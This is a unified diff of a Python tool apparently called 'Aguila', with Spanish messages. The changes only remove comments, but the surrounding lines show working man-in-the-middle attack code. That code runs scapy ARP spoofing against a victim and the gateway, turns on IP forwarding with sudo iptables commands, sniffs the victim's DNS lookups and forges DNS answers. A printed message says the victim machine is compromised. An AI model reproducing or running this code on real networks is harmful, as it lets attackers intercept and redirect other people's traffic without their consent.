@@ -92,9 +92,8 @@ def iniciar_aguila_https():
 
 def aguila_dominios_https():
 
-    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # para que no salga los mensajes de error
+    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  
 
-    # Global set for seen domains
     dominios_vistos = set()
 
     def cabecera_aguia_dominio_https():
@@ -116,10 +115,8 @@ def aguila_dominios_https():
             print("--------------------------------------------------")
             for sent, received in answered_list:
                 try:
-                    # Intenta resolver el hostname a partir de la dirección IP
                     hostname = socket.gethostbyaddr(received.psrc)[0]
                 except socket.herror:
-                    # Si no puede resolver el hostname, muestra "Unknown"
                     hostname = "Unknown"
                 print(f"{received.psrc}\t{received.hwsrc}\t{hostname}")
 
@@ -134,7 +131,7 @@ def aguila_dominios_https():
             try:
                 scapy.send(scapy.ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=victim_mac, hwsrc=my_mac), verbose=False)
                 scapy.send(scapy.ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=my_mac), verbose=False)
-                time.sleep(10)  # Cambiado de 2 a 10 segundos para reducir el tráfico ARP
+                time.sleep(10) 
             except KeyboardInterrupt:
                 print(colored("\n[!] Terminando el programa...", "red"))
                 break
@@ -174,10 +171,8 @@ def aguila_dominios_https():
 
         gateway_ip = input("Introduce la dirección IP del gateway/WiFi: ")
 
-        # Start ARP spoofing in a separate thread
         threading.Thread(target=spoof, args=(target_ip, gateway_ip, my_mac, victim_mac), daemon=True).start()
         
-        # Start DNS sniffing in a separate thread
         sniff_dns(my_interface)
         signal.signal(signal.SIGINT, signal_handler)
 
@@ -193,9 +188,8 @@ def aguila_http():
     os.system('sudo iptables --policy FORWARD ACCEPT')
     os.system('sudo echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null 2>&1')
 
-    # Global set for seen domains
     dominios_vistos = set()
-    captured_data = []  # Para almacenar los datos capturados
+    captured_data = [] 
 
     def cabecera_http():
         print('''
@@ -297,7 +291,6 @@ def aguila_http():
             print(colored("[+] Saliendo de Aguila...", "red"))
 
 
-    # Configura el manejador de señal
     signal.signal(signal.SIGINT, signal_handler)
 
     main()
@@ -312,7 +305,6 @@ def Aguila_arp_spoof():
     logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # para que no salga los mensajes de error
 
     def get_my_mac(interface):
-        # Recoge la mac de la de la máquina local
         try:
             return ni.ifaddresses(interface)[ni.AF_LINK][0]['addr']
         except ValueError:
@@ -330,10 +322,8 @@ def Aguila_arp_spoof():
             print("--------------------------------------------------")
             for sent, received in answered_list:
                 try:
-                    # Intenta resolver el hostname a partir de la dirección IP
                     hostname = socket.gethostbyaddr(received.psrc)[0]
                 except socket.herror:
-                    # Si no puede resolver el hostname, muestra "Unknown"
                     hostname = "Unknown"
                 print(f"{received.psrc}\t{received.hwsrc}\t{hostname}")
 
@@ -359,7 +349,7 @@ def Aguila_arp_spoof():
             print(colored("\n[+] Aguila ha comprometido la máquina víctima. Ejecuta Aguila-dns-spoof en otra terminal para envenenar los dominios. Consulta la documentación si es necesario: https://m4nutcp.github.io/Documentacion-Aguila/", "light_magenta"))
 
             if my_mac is not None:
-                break  # Sale del bucle si la MAC es válida
+                break 
             else:
                 print("\n[!] Introduce una interfaz válida.\n")
         while True:
@@ -433,7 +423,6 @@ def Aguila_dns_spoofer():
                     scapy_packet[scapy.DNS].an = answer
                     scapy_packet[scapy.DNS].ancount = 1
 
-                    # Solo elimina los campos si el paquete es IP/UDP
                     if scapy_packet.haslayer(scapy.UDP):
                         del scapy_packet[scapy.IP].len
                         del scapy_packet[scapy.IP].chksum
